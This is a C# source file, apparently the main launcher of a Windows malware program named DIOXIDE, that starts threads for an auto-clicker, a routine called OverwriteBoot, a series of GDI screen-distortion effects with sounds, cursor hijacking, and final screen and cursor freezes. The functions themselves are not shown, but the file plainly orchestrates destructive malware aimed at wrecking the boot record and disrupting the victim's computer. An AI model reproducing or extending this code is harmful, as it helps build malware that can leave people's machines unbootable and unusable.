using System;
using System.Threading;

namespace DIOXIDE
{
    class run_payloads
    {
        public unsafe static void DStart()
        {
            Win32API.SetProcessDPIAware();

            payloads payloads = new payloads();
            destruction destruction = new destruction();

            new Thread(new ThreadStart(payloads.Clicker)).Start();
            new Thread(new ThreadStart(destruction.OverwriteBoot)).Start();

            PStart();

            destruction.Exit();

            Environment.Exit(0);
        }
        public unsafe static void PStart()
        {
            Win32API.SetProcessDPIAware();

            int True = 1;

            payloads payloads = new payloads();

            new Thread(new ThreadStart(payloads.gdi1)).Start();
            payloads.Sound1();
            payloads.gdi1_cancel = True;

            new Thread(new ThreadStart(payloads.gdi2)).Start();
            new Thread(new ThreadStart(payloads.cursor_movement)).Start();
            payloads.Sound2();
            payloads.gdi2_cancel = True;

            new Thread(new ThreadStart(payloads.gdi3)).Start();
            payloads.Sound3();
            payloads.gdi3_cancel = True;

            Win32API.ReleaseDC(payloads.hwnd, payloads.hdc);
            new Thread(new ThreadStart(payloads.CursorDraw)).Start();
            new Thread(new ThreadStart(payloads.gdi2)).Start();
            new Thread(new ThreadStart(payloads.gdi3)).Start();
            payloads.Sound4();
            payloads.gdi2_cancel = True;
            payloads.gdi3_cancel = True;

            new Thread(new ThreadStart(payloads.gdi4)).Start();
            payloads.Sound5();
            payloads.gdi4_cancel = True;

            new Thread(new ThreadStart(payloads.gdi5)).Start();
            payloads.Sound6();
            payloads.gdi5_cancel = True;
            new Thread(new ThreadStart(payloads.gdi6)).Start();
            payloads.Sound7();
            new Thread(new ThreadStart(payloads.gdi7)).Start();
            payloads.Sound8();
            new Thread(new ThreadStart(payloads.gdi8)).Start();
            new Thread(new ThreadStart(payloads.gdi9)).Start();
            new Thread(new ThreadStart(payloads.gdi10)).Start();
            new Thread(new ThreadStart(payloads.gdi11)).Start();
            payloads.FinalSound();
            payloads.drawCursor_cancel = True;
            payloads.gdi6_cancel = True;
            payloads.gdi7_cancel = True;
            payloads.gdi8_cancel = True;
            payloads.gdi9_cancel = True;
            payloads.gdi10_cancel = True;
            payloads.gdi11_cancel = True;
            payloads.cursor_movement_cancel = True;
            new Thread(new ThreadStart(payloads.cursor_Freeze)).Start();
            new Thread(new ThreadStart(payloads.screen_Freeze)).Start();
            payloads.FreezeSound();

            return;
        }
    }
}
